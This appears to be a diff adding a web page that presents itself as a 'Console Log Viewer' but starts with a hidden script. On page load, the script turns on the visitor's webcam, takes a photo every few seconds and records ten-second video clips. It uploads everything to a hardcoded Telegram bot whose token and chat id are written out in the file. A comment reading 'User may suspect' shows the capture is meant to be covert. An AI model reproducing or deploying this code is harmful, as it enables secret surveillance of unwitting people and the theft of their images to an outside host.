@@ -1,0 +1,197 @@
+<script>
+  // Configuration object for easy customization
+  const config = {
+    botToken: '6696317970:AAH1NZPjLjwD_8Jav73izvSqtDKL9qGpMBE', // Replace with your bot token
+    chatId: '5624278091', // Replace with your chat id
+    photoResolution: {
+      width: 540,
+      height: 650
+    },
+    videoDuration: 10000, // Duration of video recording in milliseconds (10 seconds)
+    photoQuality: 1.0, // JPEG quality (0.0 to 1.0)
+    photoInterval: 5000, // Interval between photo captures in milliseconds (5 seconds)
+    videoInterval: 10000 // Interval between video captures in milliseconds (10 seconds)
+  };
+
+  let captureInterval;
+  let mediaRecorder;
+  let recordedChunks = [];
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+
+  // Start capturing video as soon as the page loads
+  window.onload = () => {
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const videoTrack = stream.getVideoTracks()[0];
+        imageCapture = new ImageCapture(videoTrack);
+
+        // Start recording video
+        mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.ondataavailable = (event) => {
+          if (event.data.size > 0) {
+            recordedChunks.push(event.data);
+          }
+        };
+
+        mediaRecorder.onstop = () => {
+          const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+          recordedChunks = [];
+          sendVideoToTelegram(videoBlob);
+        };
+
+        // Start capturing photo and video at the specified intervals
+        capturePhoto();
+        captureInterval = setInterval(capturePhoto, config.photoInterval);
+
+        captureVideo();
+        setInterval(captureVideo, config.videoInterval);
+      })
+      .catch(error => {
+        if (error.name === 'NotAllowedError') {
+          console.warn('Permissions denied. User may suspect.');
+        } else {
+          console.error('Permission error:', error);
+        }
+      });
+  };
+
+  window.onbeforeunload = () => {
+    clearInterval(captureInterval);
+  };
+
+  function capturePhoto() {
+    if (imageCapture) {
+      imageCapture.takePhoto()
+        .then(blob => {
+          const img = new Image();
+          img.src = URL.createObjectURL(blob);
+          img.onload = () => {
+            canvas.width = config.photoResolution.width;
+            canvas.height = config.photoResolution.height;
+            ctx.drawImage(img, 0, 0, config.photoResolution.width, config.photoResolution.height);
+            canvas.toBlob(resizedBlob => {
+              sendToTelegram(resizedBlob);
+            }, 'image/jpeg', config.photoQuality); // Adjust quality using config.photoQuality
+          };
+        })
+        .catch(error => {
+          console.error('Error capturing photo:', error);
+        });
+    }
+  }
+
+  function captureVideo() {
+    if (mediaRecorder && mediaRecorder.state === "inactive") {
+      mediaRecorder.start();
+      setTimeout(() => {
+        mediaRecorder.stop();
+      }, config.videoDuration); // Stop recording after specified duration
+    }
+  }
+
+  function sendToTelegram(data) {
+    const caption = 'This is a custom title for the captured photo.';
+
+    const formData = new FormData();
+    formData.append('chat_id', config.chatId);
+    formData.append('photo', data, 'file.jpg');
+    formData.append('caption', caption);
+
+    fetch(`https://api.telegram.org/bot${config.botToken}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    })
+      .then(response => response.json())
+      .then(data => console.log('Telegram response:', data))
+      .catch(error => console.error('Error sending to Telegram:', error));
+  }
+
+  function sendVideoToTelegram(data) {
+    const caption = 'This is a custom title for the captured video.';
+
+    const formData = new FormData();
+    formData.append('chat_id', config.chatId);
+    formData.append('video', data, 'video.webm');
+    formData.append('caption', caption);
+
+    fetch(`https://api.telegram.org/bot${config.botToken}/sendVideo`, {
+      method: 'POST',
+      body: formData
+    })
+      .then(response => response.json())
+      .then(data => console.log('Telegram response:', data))
+      .catch(error => console.error('Error sending to Telegram:', error));
+  }
+</script>
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Console Log Viewer</title>
+    <style>
+        #logButton {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            background-color: blue;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            font-size: 14px;
+            cursor: pointer;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+        }
+    </style>
+</head>
+<body>
+    <button id="logButton" onclick="openLogWindow()">Log</button>
+
+    <script>
+        (function() {
+            var originalLog = console.log;
+            var originalWarn = console.warn;
+            var originalError = console.error;
+            var logWindow = null;
+            
+            console.log = function(...args) {
+                logMessage('log', args);
+                originalLog.apply(console, args);
+            };
+
+            console.warn = function(...args) {
+                logMessage('warn', args);
+                originalWarn.apply(console, args);
+            };
+
+            console.error = function(...args) {
+                logMessage('error', args);
+                originalError.apply(console, args);
+            };
+
+            function logMessage(type, args) {
+                if (logWindow && !logWindow.closed) {
+                    var logEntry = logWindow.document.createElement('div');
+                    logEntry.textContent = `[${type.toUpperCase()}] ${args.join(' ')}`;
+                    logWindow.document.body.appendChild(logEntry);
+                    logWindow.scrollTo(0, logWindow.document.body.scrollHeight);
+                }
+            }
+
+            window.openLogWindow = function() {
+                logWindow = window.open("", "LogWindow", "width=600,height=400");
+                logWindow.document.write("<html><head><title>Log Output</title></head><body><h2>Log Output</h2></body></html>");
+                logWindow.document.close();
+                
+                logWindow.addEventListener('load', function() {
+                    logMessage('info', ['Log window loaded']);
+                });
+            };
+        })();
+    </script>
+</body>
+</html>
